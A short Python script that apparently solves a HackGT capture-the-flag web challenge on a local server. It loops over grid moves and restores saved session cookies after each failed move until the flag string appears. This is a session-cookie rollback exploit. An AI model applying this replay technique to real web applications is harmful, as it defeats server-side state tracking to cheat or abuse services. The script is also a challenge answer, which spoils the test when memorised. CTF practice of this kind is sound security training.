import requests
import zlib
import json
import base64
from copy import deepcopy

base_url = "http://127.0.0.1:5000"

s = requests.session()

s.get(base_url + "/game")

for i in range(4):
    match = False
    for y in range(5):
        for x in range(5):
            saved_cookies = deepcopy(s.cookies)
            resp = s.get(base_url + "/game/{}/{}".format(x, y)).text
            if resp.count('x') > i or 'hackgt8' in resp:
                match = True
                break
            else:
                s.cookies = saved_cookies
        if match:
            break

print(s.get(base_url + "/game").text)
